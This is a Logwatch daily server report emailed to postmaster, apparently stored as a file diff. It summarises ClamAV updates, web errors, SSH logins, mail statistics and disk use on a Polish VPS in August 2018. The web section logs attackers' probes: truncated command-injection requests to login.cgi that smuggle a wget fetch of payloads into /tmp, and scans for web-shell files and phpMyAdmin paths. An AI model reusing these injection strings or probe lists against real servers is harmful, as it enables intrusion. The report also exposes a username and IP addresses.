@@ -1,0 +1,298 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id CE64C9F201C8; Mon, 27 Aug 2018 03:31:14 +0200 (CEST)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20180827013114.CE64C9F201C8@hrankiety.pl>
+Date: Mon, 27 Aug 2018 03:31:13 +0200 (CEST)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Mon Aug 27 03:31:13 2018
+        Date Range Processed: yesterday
+                              ( 2018-Aug-26 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Sun Aug 26 03:50:22 2018
+ 
+ Last Status:
+    main.cvd is up to date (version: 58, sigs: 4566249, f-level: 60, builder: sigmgr)
+    Downloading daily-24871.cdiff [100%]
+    Downloading daily-24872.cdiff [100%]
+    Downloading daily-24873.cdiff [100%]
+    daily.cld updated (version: 24873, sigs: 2063308, f-level: 63, builder: neo)
+    bytecode.cld is up to date (version: 327, sigs: 91, f-level: 63, builder: neo)
+    [LibClamAV] Detected duplicate databases /var/lib/clamav/main.cvd and /var/lib/clamav/main.cld, please manually remove one of them
+    Database updated (6629648 signatures) from db.local.clamav.net (IP: 104.16.188.138)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ A total of 2 sites probed the server 
+    115.236.61.205
+    77.55.249.166
+ 
+ Requests with error response codes
+    400 Bad Request
+       /login.cgi?cli=aa%20aa%27;wget%20http://14 ... 0/tmp/ngynx%27$: 1 Time(s)
+       /login.cgi?cli=aa%20aa%27;wget%20http://17 ... h%20/tmp/hk%27$: 1 Time(s)
+       /login.cgi?cli=aa%20aa%27;wget%20http://20 ... tmp/.shinka%27$: 9 Time(s)
+       /x: 1 Time(s)
+       null: 3 Time(s)
+    404 Not Found
+       //wp-login.php: 3 Time(s)
+       /12.php: 1 Time(s)
+       /1213.php: 1 Time(s)
+       /3.php: 1 Time(s)
+       /56.php: 1 Time(s)
+       /9510.php: 1 Time(s)
+       /9678.php: 1 Time(s)
+       /PMA/index.php: 3 Time(s)
+       /PMA2/index.php: 3 Time(s)
+       /_query.php: 1 Time(s)
+       /aaaa.php: 1 Time(s)
+       /admin/PMA/index.php: 3 Time(s)
+       /admin/index.php: 3 Time(s)
+       /admin/mysql/index.php: 3 Time(s)
+       /admin/mysql2/index.php: 2 Time(s)
+       /admin/phpMyAdmin/index.php: 2 Time(s)
+       /admin/phpmyadmin/index.php: 3 Time(s)
+       /admin/phpmyadmin2/index.php: 3 Time(s)
+       /admin/pma/index.php: 3 Time(s)
+       /ak.php: 1 Time(s)
+       /ak47.php: 1 Time(s)
+       /ak48.php: 1 Time(s)
+       /angge.php: 1 Time(s)
+       /aotu.php: 1 Time(s)
+       /appserv.php: 1 Time(s)
+       /aw.php: 1 Time(s)
+       /bak.php: 1 Time(s)
+       /blog//wp-login.php: 3 Time(s)
+       /cainiao.php: 1 Time(s)
+       /claroline/phpMyAdmin/index.php: 3 Time(s)
+       /cmd.php: 3 Time(s)
+       /cmdd.php: 1 Time(s)
+       /cmv.php: 1 Time(s)
+       /cmx.php: 1 Time(s)
+       /conflg.php: 1 Time(s)
+       /data.php: 1 Time(s)
+       /db.init.php: 3 Time(s)
+       /db/index.php: 3 Time(s)
+       /db__.init.php: 1 Time(s)
+       /db_cts.php: 1 Time(s)
+       /db_dataml.php: 1 Time(s)
+       /db_desql.php: 1 Time(s)
+       /db_pma.php: 1 Time(s)
+       /db_session.init.php: 3 Time(s)
+       /dbadmin/index.php: 2 Time(s)
+       /default.php: 1 Time(s)
+       /defect.php: 1 Time(s)
+       /desktop.ini.php: 1 Time(s)
+       /fack.php: 1 Time(s)
+       /feixiang.php: 1 Time(s)
+       /h1.php: 1 Time(s)
+       /hell.php: 1 Time(s)
+       /help-e.php: 1 Time(s)
+       /help.php: 1 Time(s)
+       /hh.php: 1 Time(s)
+       /hm.php: 1 Time(s)
+       /index.action: 1 Time(s)
+       /index.do: 1 Time(s)
+       /index.php: 3 Time(s)
+       /infoo.php: 1 Time(s)
+       /ip.php: 1 Time(s)
+       /java.php: 1 Time(s)
+       /knal.php: 1 Time(s)
+       /l7.php: 1 Time(s)
+       /l8.php: 1 Time(s)
+       /lala-dpr.php: 1 Time(s)
+       /lala.php: 1 Time(s)
+       /license.php: 1 Time(s)
+       /lindex.php: 1 Time(s)
+       /log.php: 2 Time(s)
+       /logon.php: 1 Time(s)
+       /lol.php: 1 Time(s)
+       /m.php?pbid=open: 1 Time(s)
+       /min.php: 1 Time(s)
+       /muhstik-dpr.php: 1 Time(s)
+       /muhstik.php: 1 Time(s)
+       /muhstik2.php: 1 Time(s)
+       /muhstiks.php: 1 Time(s)
+       /mx.php: 1 Time(s)
+       /myadmin/index.php: 3 Time(s)
+       /myadmin2/index.php: 3 Time(s)
+       /mysql-admin/index.php: 3 Time(s)
+       /mysql/index.php: 3 Time(s)
+       /mysqladmin/index.php: 3 Time(s)
+       /mz.php: 1 Time(s)
+       /pe.php: 1 Time(s)
+       /phpMyAdmin.old/index.php: 3 Time(s)
+       /phpMyAdmin/index.php: 3 Time(s)
+       /phpMyAdmin/phpMyAdmin/index.php: 3 Time(s)
+       /phpMyAdminold/index.php: 3 Time(s)
+       /phpMyadmin_bak/index.php: 3 Time(s)
+       /phpStudy.php: 1 Time(s)
+       /phpadmin/index.php: 3 Time(s)
+       /phpinfi.php: 1 Time(s)
+       /phpma/index.php: 2 Time(s)
+       /phpmyadmin-old/index.php: 3 Time(s)
+       /phpmyadmin/index.php: 3 Time(s)
+       /phpmyadmin/phpmyadmin/index.php: 3 Time(s)
+       /phpmyadmin0/index.php: 2 Time(s)
+       /phpmyadmin1/index.php: 3 Time(s)
+       /phpmyadmin2/index.php: 3 Time(s)
+       /phpstudy.php: 1 Time(s)
+       /pma-old/index.php: 3 Time(s)
+       /pma/index.php: 3 Time(s)
+       /pmamy/index.php: 2 Time(s)
+       /pmamy2/index.php: 3 Time(s)
+       /pmd/index.php: 3 Time(s)
+       /pmd_online.php: 1 Time(s)
+       /post.php: 1 Time(s)
+       /python.php: 1 Time(s)
+       /q.php: 2 Time(s)
+       /qaq.php: 3 Time(s)
+       /qq.php: 4 Time(s)
+       /qwe.php: 1 Time(s)
+       /s.php: 3 Time(s)
+       /sheep.php: 3 Time(s)
+       /shell.php: 2 Time(s)
+       /ssaa.php: 1 Time(s)
+       /struts2-rest-showcase/orders.xhtml: 1 Time(s)
+       /system.php: 1 Time(s)
+       /test.php: 2 Time(s)
+       /text.php: 1 Time(s)
+       /tools/phpMyAdmin/index.php: 3 Time(s)
+       /typo3/phpmyadmin/index.php: 3 Time(s)
+       /uploader.php: 1 Time(s)
+       /user/register/: 1 Time(s)
+       /w.php: 3 Time(s)
+       /wan.php: 1 Time(s)
+       /wanan.php: 1 Time(s)
+       /wc.php: 3 Time(s)
+       /web/phpMyAdmin/index.php: 3 Time(s)
+       /webdav/: 3 Time(s)
+       /webslee.php: 1 Time(s)
+       /weixiao.php: 1 Time(s)
+       /wordpress//wp-login.php: 3 Time(s)
+       /wp-admins.php: 1 Time(s)
+       /wp-config.php: 1 Time(s)
+       /wp-login.php: 2 Time(s)
+       /wp//wp-login.php: 3 Time(s)
+       /wpo.php: 1 Time(s)
+       /wshell.php: 1 Time(s)
+       /wuwu11.php: 3 Time(s)
+       /www/phpMyAdmin/index.php: 3 Time(s)
+       /x.php: 1 Time(s)
+       /xampp/phpmyadmin/index.php: 2 Time(s)
+       /xiao.php: 1 Time(s)
+       /xiaoma.php: 1 Time(s)
+       /xiaomae.php: 1 Time(s)
+       /xiaomar.php: 1 Time(s)
+       /xshell.php: 1 Time(s)
+       /xw.php: 3 Time(s)
+       /xw1.php: 1 Time(s)
+       /xx.php: 4 Time(s)
+       /yao.php: 1 Time(s)
+       /yumo.php: 1 Time(s)
+       /z.php: 1 Time(s)
+       /zuo.php: 1 Time(s)
+       /zuoshou.php: 1 Time(s)
+       http://www.msftncsi.com/ncsi.txt: 1 Time(s)
+    405 Method Not Allowed
+       /: 3 Time(s)
+    408 Request Timeout
+       null: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- pam_unix Begin ------------------------ 
+
+ sshd:
+    Authentication Failures:
+       btertil (89-77-72-8.dynamic.chello.pl): 1 Time(s)
+ 
+ 
+ ---------------------- pam_unix End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+        3   *Warning: Pre-queue content-filter connection overload 
+      208   SASL authentication failed 
+       26   Miscellaneous warnings 
+ 
+  944.986K  Bytes accepted                           967,666
+  936.408K  Bytes delivered                          958,882
+ ========   ================================================
+ 
+       15   Accepted                                 100.00%
+ --------   ------------------------------------------------
+       15   Total                                    100.00%
+ ========   ================================================
+ 
+      235   Connections made      
+       11   Connections lost      
+      235   Disconnections        
+       15   Removed from queue    
+       11   Delivered             
+        4   Bounce (remote)       
+        2   DSNs undeliverable    
+ 
+        1   Timeout (inbound)     
+        1   SMTP commands dialog error 
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Failed logins from:
+    89.77.72.8 (89-77-72-8.dynamic.chello.pl): 5 times
+ 
+ Users logging in through sshd:
+    btertil:
+       89.77.72.8 (89-77-72-8.dynamic.chello.pl): 14 times
+       185.17.41.230 (backup): 2 times
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 3 Time(s)
+ 
+ **Unmatched Entries**
+ PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=89-77-72-8.dynamic.chello.pl  user=btertil : 1 time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   24G   27G  47% /
+ none            512M  4.0K  512M   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
